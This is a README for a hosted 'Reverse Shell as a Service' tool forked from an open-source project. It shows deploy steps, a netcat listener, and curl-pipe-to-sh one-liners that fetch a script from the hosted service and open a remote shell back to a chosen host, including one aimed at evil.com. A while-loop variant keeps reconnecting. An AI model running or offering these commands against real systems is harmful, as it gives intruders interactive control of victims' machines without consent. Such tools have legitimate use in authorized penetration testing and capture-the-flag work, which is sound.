# reverse-shell

> Reverse Shell as a Service - http://reverse.us.openode.io/ modified from https://github.com/lukechilds/reverse-shell and host it in https://www.openode.io/


## Deploy

* Generate Template
```shell
$ openode template
```

* enable https (optional)
```shell
$ openode set-config SSL_CERTIFICATE_PATH your-cert-folder/certfile.crt
$ openode set-config SSL_CERTIFICATE_KEY_PATH your-cert-folder/keyfile.key
```

* deploy
```shell
$ penode deploy
```

* add custom domain(actually not working)
```shell
openode add-alias youdomain.com
```

## Usage

### 1. Listen for connection

On your machine, open up a port and listen on it. You can do this easily with netcat.

```shell
nc -l 1337
```
### 2. Execute reverse shell on target

```shell
curl http://reverse.us.openode.io/192.168.0.69:1337 | sh
```
```shell
curl http://reverse.us.openode.io/localhost:1337 | sh
```
```shell
curl http://reverse.us.openode.io/evil.com:1337 | sh
```

### Reconnecting

By default when the shell exits you lose your connection. You may do this by accident with an invalid command. You can easily create a shell that will attempt to reconnect by wrapping it in a while loop.

```shell
while true; do curl http://reverse.us.openode.io/yourip:1337 | sh; done
```

## License

MIT © Luke Childs
